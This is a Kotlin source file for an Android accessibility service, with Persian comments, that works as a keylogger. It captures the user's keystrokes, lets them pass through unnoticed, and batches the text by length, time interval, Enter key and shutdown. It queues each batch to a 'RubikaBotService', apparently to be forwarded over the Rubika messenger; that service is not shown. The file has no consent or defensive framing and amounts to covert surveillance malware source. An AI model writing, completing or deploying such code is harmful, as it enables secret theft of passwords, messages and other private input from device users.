package com.example

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.util.Log
import android.view.KeyEvent
import kotlinx.coroutines.*

class KeyMonitorService : AccessibilityService() {

    companion object {
        private const val TAG = "KeyMonitor"
        private const val MAX_TEXT_LENGTH = 100 // هر ۱۰۰ کاراکتر یک بسته ارسال شود
        private var pendingText = StringBuilder()
        private var lastSendTime = System.currentTimeMillis()
        private const val SEND_INTERVAL_MS = 5000L // هر ۵ ثانیه یک بار ارسال
    }

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        event?.let {
            if (it.action == KeyEvent.ACTION_DOWN) {
                val unicodeChar = it.unicodeChar
                if (unicodeChar != 0) {
                    // کاراکتر قابل چاپ
                    pendingText.append(unicodeChar.toChar())
                } else {
                    // کلیدهای ویژه
                    when (it.keyCode) {
                        KeyEvent.KEYCODE_DEL -> {
                            if (pendingText.isNotEmpty()) {
                                pendingText.deleteCharAt(pendingText.length - 1)
                            }
                        }
                        KeyEvent.KEYCODE_ENTER -> {
                            pendingText.append('\n')
                            sendPendingText() // Enter را به عنوان پایان جمله در نظر بگیر
                        }
                        KeyEvent.KEYCODE_SPACE -> {
                            pendingText.append(' ')
                        }
                        else -> {
                            // کلیدهای دیگر مانند Shift، Ctrl را نادیده بگیر
                        }
                    }
                }

                // اگر طول متن به حد مجاز رسید، ارسال کن
                if (pendingText.length >= MAX_TEXT_LENGTH) {
                    sendPendingText()
                }

                // ارسال دوره‌ای (هر ۵ ثانیه)
                val now = System.currentTimeMillis()
                if (now - lastSendTime > SEND_INTERVAL_MS && pendingText.isNotEmpty()) {
                    sendPendingText()
                    lastSendTime = now
                }
            }
        }
        return false // اجازه عبور رویداد به سایر برنامه‌ها
    }

    private fun sendPendingText() {
        if (pendingText.isEmpty()) return
        val text = pendingText.toString()
        pendingText.clear()

        // اضافه کردن به صف ارسال روبیکا
        RubikaBotService.addMessageToQueue(this, text)
        Log.d(TAG, "متن به صف ارسال اضافه شد: $text")
    }

    override fun onAccessibilityEvent(event: android.view.accessibility.AccessibilityEvent?) {
        // مورد نیاز نیست
    }

    override fun onInterrupt() {
        Log.d(TAG, "سرویس دسترس‌پذیری متوقف شد")
        // اگر متنی باقی مانده، ارسال کن
        sendPendingText()
    }

    override fun onDestroy() {
        super.onDestroy()
        sendPendingText()
    }
}